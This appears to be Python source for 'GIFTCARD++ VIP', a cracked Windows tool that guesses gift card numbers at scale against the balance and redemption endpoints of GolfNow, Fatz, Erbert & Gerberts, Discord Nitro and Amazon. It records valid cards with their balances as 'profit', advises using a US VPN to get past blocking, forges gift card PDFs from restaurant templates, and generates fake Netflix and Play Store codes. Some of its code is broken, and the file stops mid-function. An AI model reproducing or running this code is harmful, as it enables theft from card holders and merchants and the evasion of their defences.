import requests  # line:1
import threading  # line:2
import random  # line:3
import string  # line:4
import time  # line:5
import os  # line:6
import subprocess, requests, time, os  # line:7
import colorama  # line:8
from colorama import *  # line:9
from colorama import init, Fore  # line:10
import webbrowser  # line:11
import os  # line:12
if os.name != "nt":  # line:13
    exit()  # line:14
from re import findall  # line:15
from json import loads, dumps  # line:16
from base64 import b64decode  # line:17
from subprocess import Popen, PIPE  # line:18
from urllib.request import Request, urlopen  # line:19
from datetime import datetime  # line:20
from threading import Thread  # line:21
from time import sleep  # line:22
from sys import argv  # line:23
from random import choice  # line:24
from string import digits, ascii_letters, ascii_uppercase  # line:25
from time import strftime  # line:26
import colorama  # line:27
from colorama import init, Fore  # line:28
from ctypes import windll  # line:29
from colorama import *  # line:30
import os  # line:31
import json  # line:32
import sys  # line:33
import binascii  # line:34
from pathlib import Path  # line:35
import requests  # line:36
import colorama  # line:37
from colorama import *  # line:38
init()  # line:39
from uuid import uuid4  # line:40
valid = 0  # line:41
from Cryptodome.Cipher import AES  # line:43
from Cryptodome.Hash import SHA256  # line:44
from Cryptodome.Util.Padding import pad, unpad  # line:45
import os  # line:46
import time  # line:47
import webbrowser  # line:48
import webbrowser, platform, subprocess, datetime  # line:52



updatenew = urlopen(Request("https://pastebin.com/raw/UCgAGfYT")).read().decode()  # line:322
discord = 'https://discord.gg/UDvBFRASFY'  # line:323
init()  # line:324
unix = str(strftime('-[%d-%m-%Y %H-%M-%S]'))  # line:325
x = 1  # line:326
gen_num = '\nEnter amount of codes to be generated: '  # line:327
me = urlopen(Request("https://pastebin.com/raw/bJaY2GB0")).read().decode()  # line:328
version = urlopen(Request("https://pastebin.com/raw/wzFaGVav")).read().decode()  # line:329
def id(id_length, id_chars):  # line:331
    return ''.join(choice(id_chars) for _ in range(id_length))  # line:332
def gen(O0OO0000000O0OOOO, O00O0O0OOOOO0O0OO):  # line:335
    count = 1  # line:336
    gen_amount = int(input(gen_num))  # line:337
    with open(f'{O0OO0000000O0OOOO}{unix}.txt', 'w')as f:  # line:338
        while count <= gen_amount:  # line:339
            f.write(f'{id(digits)}\n')  # line:340
            count += 1  # line:341
        f.close()  # line:342
def remove():  # line:346
    os.unlink('dont_need_this.png')  # line:347
def makepdfaurbees():  # line:351
    temp_img = Image.open("dont_need_this.png")  # line:352
    if temp_img.mode == 'RGBA':  # line:353
        temp_img = temp_img.convert('RGB')  # line:354
    pdf = (" Aubree's Pizzeria and Grill.pdf")  # line:355
    if not os.path.exists(pdf):  # line:356
        temp_img.save(pdf, "PDF", resulotion=100.0)  # line:357
def makepdfapple():  # line:360
    temp_img = Image.open("dont_need_this.png")  # line:361
    if temp_img.mode == 'RGBA':  # line:362
        temp_img = temp_img.convert('RGB')  # line:363
    pdf = ("Applebees.pdf")  # line:364
    if not os.path.exists(pdf):  # line:365
        temp_img.save(pdf, "PDF", resulotion=100.0)  # line:366
def makepdfnoodle():  # line:369
    temp_img = Image.open("dont_need_this.png")  # line:370
    if temp_img.mode == 'RGBA':  # line:371
        temp_img = temp_img.convert('RGB')  # line:372
    pdf = ("Noodles & Co.pdf")  # line:373
    if not os.path.exists(pdf):  # line:374
        temp_img.save(pdf, "PDF", resulotion=100.0)  # line:375
def makepdferberts():  # line:378
    temp_img = Image.open("dont_need_this.png")  # line:379
    if temp_img.mode == 'RGBA':  # line:380
        temp_img = temp_img.convert('RGB')  # line:381
    pdf = ("Erberts & Gerberts.pdf")  # line:382
    if not os.path.exists(pdf):  # line:383
        temp_img.save(pdf, "PDF", resulotion=100.0)  # line:384
def aurebees():  # line:388
    gift_code = input('What Is Your Gift Card?: ')  # line:389
    dont_touch_img = Image.open("./PDF - DONT TOUCH/aubrees - DONT TOUCH.png")  # line:391
    font = ImageFont.truetype("arial.ttf", 10)  # line:392
    img_draw = ImageDraw.Draw(dont_touch_img)  # line:395
    img_draw.text((8, 178), gift_code, (0, 0, 0), font=font)  # line:397
    dont_touch_img.save('dont_need_this.png')  # line:398
    makepdfaurbees()  # line:399
    remove()  # line:400
    Menuu()  # line:401
def erber():  # line:404
    gift_code = input('What Is Your Gift Card?: ')  # line:405
    dont_touch_img = Image.open("./PDF - DONT TOUCH/erberts - DONT TOUCH.png")  # line:407
    font = ImageFont.truetype("arial.ttf", 10)  # line:408
    img_draw = ImageDraw.Draw(dont_touch_img)  # line:411
    img_draw.text((22, 175), gift_code, (0, 0, 0), font=font)  # line:413
    dont_touch_img.save('dont_need_this.png')  # line:414
    makepdferberts()  # line:415
    remove()  # line:416
    Menuu()  # line:417
def noodle():  # line:420
    gift_code = input('What Is Your Gift Card?: ')  # line:421
    dont_touch_img = Image.open("./PDF - DONT TOUCH/noodles - DONT TOUCH.png")  # line:423
    font = ImageFont.truetype("arial.ttf", 10)  # line:424
    img_draw = ImageDraw.Draw(dont_touch_img)  # line:427
    img_draw.text((88, 64), gift_code, (0, 0, 0), font=font)  # line:429
    dont_touch_img.save('dont_need_this.png')  # line:430
    makepdfnoodle()  # line:431
    remove()  # line:432
    Menuu()  # line:433
def apple12():  # line:435
    gift_code = input('What Is Your Gift Card?: ')  # line:436
    dont_touch_img = Image.open("./PDF - DONT TOUCH/applebees - DONT TOUCH.png")  # line:438
    font = ImageFont.truetype("arial.ttf", 10)  # line:439
    img_draw = ImageDraw.Draw(dont_touch_img)  # line:442
    img_draw.text((98, 90), gift_code, (0, 0, 0), font=font)  # line:444
    dont_touch_img.save('dont_need_this.png')  # line:445
    makepdfapple()  # line:446
    remove()  # line:447
    Menuu()  # line:448
hits = 0  # line:454
free = 0  # line:455
invalid = 0  # line:456
profit = 0  # line:457
lock = threading.Lock()  # line:458
update = lambda: os.system(
    f'title [GIFTCARD++ VIP] By {me} ^| Version: {version} ^| Profit: ${profit} ^| Valid: {hits} ^| Free: {free} ^| Invalid: {invalid} ^| Checked: {hits + free + invalid}')  # line:459
def Safe(balance_info):  # line:461
    lock.acquire()  # line:462
    print(balance_info)  # line:463
    lock.release()  # line:464
class GiftCard:  # line:466
    def Golfnow(self):  # line:468
        global hits, free, invalid, profit  # line:469
        golf_gift_code = '6275717343' + ''.join(
            random.choice(string.digits) for _ in range(6))  # line:470
        golf_req = requests.get(
            f'https://giftcard.golfnow.com/api/checkBalance?number={golf_gift_code}')  # line:471
        if 'balance' in golf_req.text:  # line:472
            if golf_req.json()['balance'] == '1' or golf_req.json()['balance'] == '0.00':  # line:473
                free += 1  # line:474
                update()  # line:475
                with open('Golfnow-Free.txt', 'a+', encoding='UTF-8')as f:  # line:476
                    f.write(f'{golf_gift_code}\n')  # line:477
                    f.close()  # line:478
            else:  # line:479
                hits += 1  # line:480
                balance = golf_req.json()['balance']  # line:481
                profit += int(balance.split('.')[0])  # line:482
                Safe(
                    f'[\033[92m+\033[39m] Hit     \033[92m|\033[39m {golf_gift_code} \033[92m|\033[39m Balance: ${balance}')  # line:483
                update()  # line:484
                with open('Golfnow-Hits.txt', 'a+', encoding='UTF-8')as f:  # line:485
                    f.write(f'{golf_gift_code} | Balance: ${balance}\n')  # line:486
                    f.close()  # line:487
        else:  # line:488
            invalid += 1  # line:489
            update()  # line:490
            with open('Golfnow-Invalid.txt', 'a+', encoding='UTF-8')as f:  # line:491
                f.write(f'{golf_gift_code}\n')  # line:492
                f.close()  # line:493
    def Fatz(self):  # line:495
        global hits, free, invalid, profit  # line:496
        fatz_gift_code = '114400' + ''.join(
            random.choice(string.digits) for _ in range(5))  # line:497
        fatz_req = requests.get(f'https://fatz.com/balance-checker/?cn={fatz_gift_code}')  # line:498
        if 'Your access to this site has been limited by the site owner' in fatz_req.text:  # line:499
            print('[\033[93m!\033[39m] Your IP Must Be Located In USA, Please Connect To A USA VPN!')  # line:500
            return  # line:501
        balance = fatz_req.text.split('You have $')[1].split(' remaining')[0]  # line:502
        if balance > "0.01":  # line:503
            hits += 1  # line:504
            profit += int(balance.split('.')[0])  # line:505
            Safe(
                f'[\033[92m+\033[39m] Hit        \033[92m|\033[39m {fatz_gift_code} \033[92m|\033[39m Balance: ${balance}')  # line:506
            update()  # line:507
            with open('Fatz-Hits.txt', 'a+', encoding='UTF-8')as f:  # line:508
                f.write(f'{fatz_gift_code} | Balance: ${balance}\n')  # line:509
                f.close()  # line:510
        if balance < "$0.01":  # line:511
            invalid += 1  # line:512
            update()  # line:513
            with open('Fatz-Invalid.txt', 'a+', encoding='UTF-8')as f:  # line:514
                f.write(f'{fatz_gift_code}\n')  # line:515
                f.close()  # line:516
    def ErbertAndGerberts(self):  # line:519
        global hits, free, invalid, profit  # line:520
        eag_gift_code = '178050000' + ''.join(
            random.choice(string.digits) for _ in range(5))  # line:521
        eag_req = requests.get(
            f'https://www.erbertandgerberts.com/wp-content/themes/erbertandgerberts/ajax/gift-card-balance.php?cardNumber={eag_gift_code}')  # line:522
        if 'Error' in eag_req.text:  # line:523
            invalid += 1  # line:524
            update()  # line:525
            with open('ErbertAndGerberts-Invalid.txt', 'a+', encoding='UTF-8')as f:  # line:526
                f.write(f'{eag_gift_code}\n')  # line:527
                f.close()  # line:528
        if 'Remaining balance:' in eag_req.text:  # line:529
            balance = eag_req.text.split('$')[1].split('</p>')[0]  # line:530
            if balance == '0.00':  # line:531
                invalid += 1  # line:532
                update()  # line:533
                with open('ErbertAndGerberts-Invalid.txt', 'a+', encoding='UTF-8')as f:  # line:534
                    f.write(f'{eag_gift_code}\n')  # line:535
                    f.close()  # line:536
            else:  # line:537
                hits += 1  # line:538
                profit += int(balance.split('.')[0])  # line:539
                Safe(
                    f'[\033[92m+\033[39m] Hit        \033[92m|\033[39m {eag_gift_code} \033[92m|\033[39m Balance: ${balance}')  # line:540
                update()  # line:541
                with open('ErbertAndGerberts-Hits.txt', 'a+', encoding='UTF-8')as f:  # line:542
                    f.write(f'{eag_gift_code} | Balance: ${balance}\n')  # line:543
                    f.close()  # line:544
class Engine:  # line:546
    def ErbertAndGerberts(self, thread_amounts):  # line:548
        os.system(f'cls & title [GIFTCARD++ VIP] By {me} ^| Version: {version}')  # line:549
        print('''
\033[94m     _______________________________    ____  ____            \033[39m    
\033[94m    / ____/  _/ ____/_  __/ ____/   |  / __ \/ __ \  __    __ \033[39m    
\033[94m   / / __ / // /_    / / / /   / /| | / /_/ / / / /_/ /___/ /_\033[39m   
\033[94m  / /_/ // // __/   / / / /___/ ___ |/ _, _/ /_/ /_  __/_  __/\033[39m
\033[94m  \____/___/_/     /_/  \____/_/  |_/_/ |_/_____/ /_/   /_/   \033[39m
                            \033[94m V.I.P\033[39m Cracked by THC4L cheatz
[\033[94m!\033[39m] Started ErbertAndGerberts Bruteforcer
        ''')  # line:559
        while True:  # line:560
            try:  # line:561
                if threading.active_count() < thread_amounts:  # line:562
                    threading.Thread(target=GiftCard.ErbertAndGerberts).start()  # line:563
            except Exception:  # line:564
                break  # line:565
        time.sleep(10)  # line:566
        print('[\033[93m!\033[39m] ErbertAndGerberts Giftcard Bruteforcer Stopped!')  # line:567
        input()  # line:568
        os._exit(0)  # line:569
    def Golfnow(self, thread_amounts):  # line:571
        os.system(f'cls & title [GIFTCARD++ VIP] By {me} ^| Version: {version}')  # line:572
        print('''
\033[94m     _______________________________    ____  ____            \033[39m    
\033[94m    / ____/  _/ ____/_  __/ ____/   |  / __ \/ __ \  __    __ \033[39m    
\033[94m   / / __ / // /_    / / / /   / /| | / /_/ / / / /_/ /___/ /_\033[39m   
\033[94m  / /_/ // // __/   / / / /___/ ___ |/ _, _/ /_/ /_  __/_  __/\033[39m
\033[94m  \____/___/_/     /_/  \____/_/  |_/_/ |_/_____/ /_/   /_/   \033[39m
                            \033[94m V.I.P\033[39m Cracked by THC4L cheatz
[\033[94m!\033[39m] Started Golfnow Bruteforcer
        ''')  # line:582
        while True:  # line:583
            try:  # line:584
                if threading.active_count() < thread_amounts:  # line:585
                    threading.Thread(target=GiftCard.Golfnow).start()  # line:586
            except Exception:  # line:587
                break  # line:588
        time.sleep(10)  # line:589
        print('[\033[93m!\033[39m] Golfnow Giftcard Bruteforcer Stopped!')  # line:590
        input()  # line:591
        os._exit(0)  # line:592
    def Fatz(self, thread_amounts):  # line:594
        os.system(f'cls & title [GIFTCARD++ VIP] By {me} ^| Version: {version}')  # line:595
        print('''
\033[94m     _______________________________    ____  ____            \033[39m    
\033[94m    / ____/  _/ ____/_  __/ ____/   |  / __ \/ __ \  __    __ \033[39m    
\033[94m   / / __ / // /_    / / / /   / /| | / /_/ / / / /_/ /___/ /_\033[39m   
\033[94m  / /_/ // // __/   / / / /___/ ___ |/ _, _/ /_/ /_  __/_  __/\033[39m
\033[94m  \____/___/_/     /_/  \____/_/  |_/_/ |_/_____/ /_/   /_/   \033[39m
                            \033[94m V.I.P\033[39m Cracked by THC4L cheatz
[\033[94m!\033[39m] Started Fatz Bruteforcer
        ''')  # line:605
        while True:  # line:606
            try:  # line:607
                if threading.active_count() < thread_amounts:  # line:608
                    threading.Thread(target=GiftCard.Fatz).start()  # line:609
            except Exception:  # line:610
                break  # line:611
        time.sleep(10)  # line:612
        print('[\033[93m!\033[39m] Fatz Giftcard Bruteforcer Stopped!')  # line:613
        input()  # line:614
        os._exit(0)  # line:615
def discordnitrobrute():  # line:617
    os.system(f'cls & title [GIFTCARD++ VIP] By {me} ^| Version: {version}')  # line:618
    print('''
\033[94m     _______________________________    ____  ____            \033[39m    
\033[94m    / ____/  _/ ____/_  __/ ____/   |  / __ \/ __ \  __    __ \033[39m    
\033[94m   / / __ / // /_    / / / /   / /| | / /_/ / / / /_/ /___/ /_\033[39m   
\033[94m  / /_/ // // __/   / / / /___/ ___ |/ _, _/ /_/ /_  __/_  __/\033[39m
\033[94m  \____/___/_/     /_/  \____/_/  |_/_/ |_/_____/ /_/   /_/   \033[39m
                            \033[94m V.I.P\033[39m Cracked by THC4L cheatz
[\033[94m!\033[39m] Started Discord Nitro Bruteforcer
        ''')  # line:628
    valid_nitro_f = open("Valid Nitro.txt", "w", encoding='utf-8')  # line:629
    invalid_nitro_f = open("Invalid Nitro.txt", "w", encoding='utf-8')  # line:630
    while True:  # line:632
        nitro_gift_code = ('').join(random.choices(string.ascii_letters + string.digits, k=16))  # line:633
        nitro_req = requests.get(
            f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro_gift_code}?with_application=false&with_subscription_plan=true")  # line:634
        if nitro_req.status_code == 200:  # line:635
            print(Fore.GREEN + f"Valid Nitro Code > discord.gift/{nitro_gift_code}")  # line:636
            valid_nitro_f.write(f"discord.gift/{nitro_gift_code}\n")  # line:637
        else:  # line:638
            print(Fore.RED + f"Invalid Nitro Code > discord.gift/{nitro_gift_code}")  # line:639
            invalid_nitro_f.write(f"Invalid Nitro Code > https://discord.gift/{nitro_gift_code}\n")  # line:640
def Menu():  # line:644
    os.system(f'cls & title [GIFTCARD++ VIP] By {me} ^| Version: {version}')  # line:645
    print(f'''
\033[94m     _______________________________    ____  ____            \033[39m    
\033[94m    / ____/  _/ ____/_  __/ ____/   |  / __ \/ __ \  __    __ \033[39m    
\033[94m   / / __ / // /_    / / / /   / /| | / /_/ / / / /_/ /___/ /_\033[39m   
\033[94m  / /_/ // // __/   / / / /___/ ___ |/ _, _/ /_/ /_  __/_  __/\033[39m
\033[94m  \____/___/_/     /_/  \____/_/  |_/_/ |_/_____/ /_/   /_/   \033[39m
                            \033[94m V.I.P\033[39m Cracked by THC4L cheatz
\033[90m[\033[90m\033[94m+\033[39m\033[90m]\033[0m GIFTCARD++ - #1 Giftcard AIO
\033[90m[\033[90m\033[94m1\033[39m\033[90m]\033[0m Golfnow Bruteforcer
\033[90m[\033[90m\033[94m2\033[39m\033[90m]\033[0m Erberts & Gerberts Bruteforcer
\033[90m[\033[90m\033[94m3\033[39m\033[90m]\033[0m Fatz Bruteforcer
\033[90m[\033[90m\033[31m0\033[31m\033[90m]\033[0m Back
''')  # line:665
    choice = input('\033[94m>>\033[39m ')  # line:666
    engine = Engine()
    if choice == '1':  # line:667
        try:  # line:668
            golf_threads = int(input('[\033[94m>>\033[39m] Threads\033[94m:\033[39m '))  # line:669
        except:  # line:670
            print('[\033[93m!\033[39m] Invalid Threads Amount.')  # line:671
            time.sleep(2)  # line:672
            Menu()  # line:673
        print()  # line:674
        engine.Golfnow(golf_threads)  # line:675
    elif choice == '0':  # line:677
        Menuu()  # line:678
    elif choice == '3':  # line:680
        try:  # line:681
            golf_threads = int(input('[\033[94m>>\033[39m] Threads\033[94m:\033[39m '))  # line:682
            print()  # line:683
            engine.Fatz(golf_threads)  # line:684
        except:  # line:685
            print('[\033[93m!\033[39m] Invalid Threads Amount.')  # line:686
            time.sleep(2)  # line:687
            Menu()  # line:688
    elif choice == '2':  # line:690
        try:  # line:691
            golf_threads = int(input('[\033[94m>>\033[39m] Threads\033[94m:\033[39m '))  # line:692
            print()  # line:693
            engine.ErbertAndGerberts(golf_threads)  # line:694
        except:  # line:695
            print('[\033[93m!\033[39m] Invalid Threads Amount.')  # line:696
            time.sleep(2)  # line:697
            Menu()  # line:698
    elif choice == '4':  # line:700
        discordnitrobrute()  # line:701
    else:  # line:706
        print('[\033[31m!\033[0m] Invalid Option')  # line:707
        time.sleep(2)  # line:708
        Menu()  # line:709
def amazonbrute():  # line:711
    os.system(f'cls & title [GIFTCARD++ VIP] By {me} ^| Version: {version}')  # line:712
    print('''
\033[94m     _______________________________    ____  ____            \033[39m    
\033[94m    / ____/  _/ ____/_  __/ ____/   |  / __ \/ __ \  __    __ \033[39m    
\033[94m   / / __ / // /_    / / / /   / /| | / /_/ / / / /_/ /___/ /_\033[39m   
\033[94m  / /_/ // // __/   / / / /___/ ___ |/ _, _/ /_/ /_  __/_  __/\033[39m
\033[94m  \____/___/_/     /_/  \____/_/  |_/_/ |_/_____/ /_/   /_/   \033[39m
                            \033[94m V.I.P\033[39mCracked by THC4L cheatz
[\033[94m!\033[39m] Started Amazon Bruteforcer
        ''')  # line:722
    while True:  # line:723
        amazon_code = ('').join(random.choices(string.ascii_letters + string.digits, k=13))  # line:724
        claim_code = """ <b>Enter claim code</b> """  # line:725
        amazon_req = requests.post("https://www.amazon.com/gc/redeem?ref_=gcui_b_e_r_c_d_b_w",
                                   data={"giftcard": amazon_code})  # line:726
        amazon = amazon_req.text  # line:727
        if claim_code in amazon:  # line:728
            f = open("Valid Amazon.txt", "w", encoding='utf-8')  # line:729
            print(Fore.GREEN + '[Valid] ' + amazon_code)  # line:730
            f.write(amazon_code + "\n")  # line:731
            f.close()  # line:732
        else:  # line:733
            f = open("Invalid Amazon.txt", "w", encoding='utf-8')  # line:734
            print(Fore.RED + '[Invalid] ' + amazon_code)  # line:735
            f.write(amazon_code + "\n")  # line:736
            f.close()  # line:737
def eGiftBrute():  # line:741
    os.system(f'cls & title [GIFTCARD++ VIP] By {me} ^| Version: {version}')  # line:742
    print(f'''
\033[94m     _______________________________    ____  ____            \033[39m    
\033[94m    / ____/  _/ ____/_  __/ ____/   |  / __ \/ __ \  __    __ \033[39m    
\033[94m   / / __ / // /_    / / / /   / /| | / /_/ / / / /_/ /___/ /_\033[39m   
\033[94m  / /_/ // // __/   / / / /___/ ___ |/ _, _/ /_/ /_  __/_  __/\033[39m
\033[94m  \____/___/_/     /_/  \____/_/  |_/_/ |_/_____/ /_/   /_/   \033[39m
                            \033[94m V.I.P\033[39m Cracked by THC4L cheatz
\033[90m[\033[90m\033[94m+\033[39m\033[90m]\033[0m GIFTCARD++ - #1 Giftcard AIO
\033[90m[\033[90m\033[94m1\033[39m\033[90m]\033[0m Nitro Bruteforcer
\033[90m[\033[90m\033[94m2\033[39m\033[90m]\033[0m Amazon Bruteforcer
\033[90m[\033[90m\033[31m0\033[31m\033[90m]\033[0m Back
''')  # line:761
    choice = input('\033[94m>>\033[39m ')  # line:763
    if choice == '1':  # line:764
        discordnitrobrute()  # line:765
    elif choice == '2':  # line:766
        amazonbrute()  # line:767
    elif choice == '0':  # line:768
        Menuu()  # line:769
    else:  # line:771
        print('[\033[31m!\033[0m] Invalid Option')  # line:772
        time.sleep(2)  # line:773
        eGiftBrute()  # line:774
def MenuCheckers():  # line:781
    os.system(f'cls & title [GIFTCARD++ VIP] By {me} ^| Version: {version}')  # line:782
    print(f'''
\033[94m     _______________________________    ____  ____            \033[39m    
\033[94m    / ____/  _/ ____/_  __/ ____/   |  / __ \/ __ \  __    __ \033[39m    
\033[94m   / / __ / // /_    / / / /   / /| | / /_/ / / / /_/ /___/ /_\033[39m   
\033[94m  / /_/ // // __/   / / / /___/ ___ |/ _, _/ /_/ /_  __/_  __/\033[39m
\033[94m  \____/___/_/     /_/  \____/_/  |_/_/ |_/_____/ /_/   /_/   \033[39m
                            \033[94m V.I.P\033[39m Cracked by THC4L cheatz
\033[90m[\033[90m\033[94m+\033[39m\033[90m]\033[0m GIFTCARD++ - #1 Giftcard AIO
\033[90m[\033[90m\033[94m1\033[39m\033[90m]\033[0m Golfnow Checker
\033[90m[\033[90m\033[94m2\033[39m\033[90m]\033[0m Erberts & Gerberts Checker
\033[90m[\033[90m\033[94m3\033[39m\033[90m]\033[0m Fatz Checker
\033[90m[\033[90m\033[94m4\033[39m\033[90m]\033[0m Discord Nitro Checker
\033[90m[\033[90m\033[31m0\033[31m\033[90m]\033[0m Back
''')  # line:803
    choice = input('\033[94m>>\033[39m ')  # line:805
    if choice == '0':  # line:806
        Menuu()  # line:807
    elif choice == '2':  # line:813
        eag_gift_code = input('[\033[94m?\033[39m] Giftcard\033[94m:\033[39m ')  # line:814
        eag_req = requests.get(
            f'https://www.erbertandgerberts.com/wp-content/themes/erbertandgerberts/ajax/gift-card-balance.php?cardNumber={eag_gift_code}')  # line:815
        if 'Remaining balance:' in eag_req.text:  # line:816
            balance = eag_req.text.split('$')[1].split('</p>')[0]  # line:817
            if balance == '0.00':  # line:818
                print(f'[\033[91m-\033[39m] Invalid \033[91m|\033[39m {eag_gift_code}')  # line:819
                input()  # line:820
                MenuCheckers()  # line:821
            else:  # line:822
                print(
                    f'[\033[92m+\033[39m] Valid     \033[92m|\033[39m {eag_gift_code} \033[92m|\033[39m Balance: ${balance}')  # line:823
                input()  # line:824
                MenuCheckers()  # line:825
        if 'Error' in eag_req.text:  # line:826
            print(f'[\033[91m-\033[39m] Invalid \033[91m|\033[39m {eag_gift_code}')  # line:827
            input()  # line:828
            MenuCheckers()  # line:829
    elif choice == '1':  # line:831
        eag_gift_code = input('[\033[94m?\033[39m] Giftcard\033[94m:\033[39m ')  # line:832
        eag_req = requests.get(
            f'https://giftcard.golfnow.com/api/checkBalance?number={eag_gift_code}')  # line:833
        if 'balance' in eag_req.text:  # line:834
            if eag_req.json()['balance'] == '1' or eag_req.json()['balance'] == '0.00':  # line:835
                print(f'[\033[93m!\033[39m] Free    \033[93m|\033[39m {eag_gift_code}')  # line:836
                input()  # line:837
                MenuCheckers()  # line:838
            else:  # line:839
                balance = eag_req.json()['balance']  # line:840
                print(
                    f'[\033[92m+\033[39m] Valid     \033[92m|\033[39m {eag_gift_code} \033[92m|\033[39m Balance: ${balance}')  # line:841
                input()  # line:842
                MenuCheckers()  # line:843
        else:  # line:844
            print(f'[\033[91m-\033[39m] Invalid \033[91m|\033[39m {eag_gift_code}')  # line:845
            input()  # line:846
            MenuCheckers()  # line:847
    elif choice == '3':  # line:849
        eag_gift_code = input('[\033[94m?\033[39m] Giftcard\033[94m:\033[39m ')  # line:850
        eag_req = requests.get(f'https://fatz.com/balance-checker/?cn={eag_gift_code}')  # line:851
        balance = eag_req.text.split('You have ')[1].split(' remaining')[0]  # line:852
        if balance > "$0.01":  # line:853
            print(
                f'[\033[92m+\033[39m] Valid        \033[92m|\033[39m {eag_gift_code} \033[92m|\033[39m Balance: {balance}')  # line:854
            input()  # line:855
            MenuCheckers()  # line:856
        if balance < "$0.01":  # line:857
            print(f'[\033[91m-\033[39m] Invalid    \033[91m|\033[39m {eag_gift_code}')  # line:858
            input()  # line:859
            MenuCheckers()  # line:860
    elif choice == '4':  # line:861
        eag_gift_code = input(
            '[\033[94m?\033[39m] Giftcard (whitout https://discord.gift/)\033[94m:\033[39m ')  # line:862
        eag_req = requests.get(
            f"https://discordapp.com/api/v6/entitlements/gift-codes/{eag_gift_code}?with_application=false&with_subscription_plan=true")  # line:863
        if eag_req.status_code == 200:  # line:864
            print(f"Valid Nitro Code > discord.gift/{eag_gift_code}")  # line:865
        else:  # line:866
            print(f"Invalid Nitro Code > discord.gift/{eag_gift_code}")  # line:867
            input()  # line:868
            MenuCheckers()  # line:869
    else:  # line:877
        print('[\033[31m!\033[0m] Invalid Option')  # line:878
        time.sleep(2)  # line:879
        MenuCheckers()  # line:880
def Menuu():  # line:883
    os.system(f'cls & title [GIFTCARD++ VIP] By {me} ^| Version: {version}')  # line:884
    print(f'''
\033[94m     _______________________________    ____  ____            \033[39m    
\033[94m    / ____/  _/ ____/_  __/ ____/   |  / __ \/ __ \  __    __ \033[39m    
\033[94m   / / __ / // /_    / / / /   / /| | / /_/ / / / /_/ /___/ /_\033[39m   
\033[94m  / /_/ // // __/   / / / /___/ ___ |/ _, _/ /_/ /_  __/_  __/\033[39m
\033[94m  \____/___/_/     /_/  \____/_/  |_/_/ |_/_____/ /_/   /_/   \033[39m
                            \033[94m V.I.P\033[39m Cracked by THC4L cheatz

\033[90m[\033[90m\033[94m1\033[39m\033[90m]\033[0m Bruteforcers
\033[90m[\033[90m\033[94m2\033[39m\033[90m]\033[0m eGiftcard Bruteforcer
\033[90m[\033[90m\033[94m3\033[39m\033[90m]\033[0m Giftcard Generators
\033[90m[\033[90m\033[94m4\033[39m\033[90m]\033[0m eGiftcard Generators
\033[90m[\033[90m\033[94m5\033[39m\033[90m]\033[0m Checkers
\033[90m[\033[90m\033[94m7\033[39m\033[90m]\033[0m Module Creator
\033[90m[\033[90m\033[94m8\033[39m\033[90m]\033[0m Discord
\033[90m[\033[90m\033[94m10\033[39m\033[90m]\033[0m Credits

''')  # line:911
    choice = input('\033[94m>>\033[39m ')  # line:912
    if choice == '1':  # line:913
        Menu()  # line:914
    elif choice == '3':  # line:916
        Generator()  # line:917
    elif choice == '2':  # line:919
        eGiftBrute()  # line:920
    elif choice == '5':  # line:923
        MenuCheckers()  # line:924
    elif choice == '4':  # line:927
        eGIFT()  # line:928
    elif choice == '6':  # line:930
        PDF()  # line:931
    elif choice == '7':  # line:935
        print('Coming Soon...')  # line:936
        time.sleep(4)  # line:937
        Menuu()  # line:938
    elif choice == '8':  # line:940
        webbrowser.open_new(discord)  # line:941
        Menuu()  # line:942
    elif choice == '9':  # line:944
        print('Coming Soon...')  # line:945
        time.sleep(4)  # line:946
        Menuu()  # line:947
    elif choice == '10':  # line:950
        print(Fore.BLUE + 'Big Thanks to :  ')  # line:951
        print(Fore.BLUE + '---------------------------')  # line:952
        print(Fore.BLUE + '|Get cracked              |')  # line:953
        print(Fore.BLUE + '|Get cracked              |')  # line:954
        print(Fore.BLUE + '|!THC4L cheatz#6666       |')  # line:955
        print(Fore.BLUE + '---------------------------')  # line:956
        time.sleep(5)  # line:957
        Menuu()  # line:958
    elif choice == '11':  # line:961
        print(Fore.BLUE + "Your current version is :")  # line:962
        print(current_version)  # line:963
        print("If you want to check for updates restart program !")  # line:964
        time.sleep(3)  # line:965
        Menuu()  # line:966
    else:  # line:969
        print('[\033[31m!\033[0m] Invalid Option')  # line:970
        time.sleep(2)  # line:971
        Menuu()  # line:972
def gennetflix():  # line:974
    possible_chars = 'ABCDEFGHJHIKLMNOPQRSTUVWXYZ0123456789'  # line:975
    print(Fore.WHITE + "How Many Would You Like To Generate? ")  # line:976
    amount_of_codes_input = input(Fore.BLUE + ">>")  # line:977
    amount_of_codes = int(amount_of_codes_input)  # line:978
    for _ in range(amount_of_codes):  # line:979
        x1 = random.choice(possible_chars)  # line:980
        x2 = random.choice(possible_chars)  # line:981
        x3 = random.choice(possible_chars)  # line:982
        x4 = random.choice(possible_chars)  # line:983
        dash1 = "-"  # line:984
        x5 = random.choice(possible_chars)  # line:985
        x6 = random.choice(possible_chars)  # line:986
        x7 = random.choice(possible_chars)  # line:987
        x8 = random.choice(possible_chars)  # line:988
        x9 = random.choice(possible_chars)  # line:989
        x10 = random.choice(possible_chars)  # line:990
        dash2 = "-"  # line:991
        x11 = random.choice(possible_chars)  # line:992
        x12 = random.choice(possible_chars)  # line:993
        x13 = random.choice(possible_chars)  # line:994
        x14 = random.choice(possible_chars)  # line:995
        newline = "\n"  # line:996
        with open(f"generatednetflix.txt", 'a')as f:  # line:997
            f.write(
                x1 + x2 + x3 + x4 + dash1 + x5 + x6 + x7 + x8 + x9 + x10 + dash2 + x11 + x12 + x13 + x14 + newline)  # line:998
def genplaystore():  # line:1001
    possible_chars = 'ABCDEFGHJHIKLMNOPQRSTUVWXYZ0123456789'  # line:1002
    print(Fore.WHITE + "How Many Would You Like To Generate? ")  # line:1003
    amount_of_codes_input = input(Fore.BLUE + ">>")  # line:1004
    amount_of_codes = int(amount_of_codes_input)  # line:1005
    for _ in range(amount_of_codes):  # line:1006
        x1 = random.choice(possible_chars)  # line:1007
        x2 = random.choice(possible_chars)  # line:1008
        x3 = random.choice(possible_chars)  # line:1009
        x4 = random.choice(possible_chars)  # line:1010
        dash1 = "-"  # line:1011
        x5 = random.choice(possible_chars)  # line:1012
        x6 = random.choice(possible_chars)  # line:1013
        x7 = random.choice(possible_chars)  # line:1014
        x8 = random.choice(possible_chars)  # line:1015
        dash2 = "-"  # line:1016
        x9 = random.choice(possible_chars)  # line:1017
        x10 = random.choice(possible_chars)  # line:1018
        x11 = random.choice(possible_chars)  # line:1019
        x12 = random.choice(possible_chars)  # line:1020
        dash3 = "-"  # line:1021
        x13 = random.choice(possible_chars)  # line:1022
        x14 = random.choice(possible_chars)  # line:1023
        x15 = random.choice(possible_chars)  # line:1024
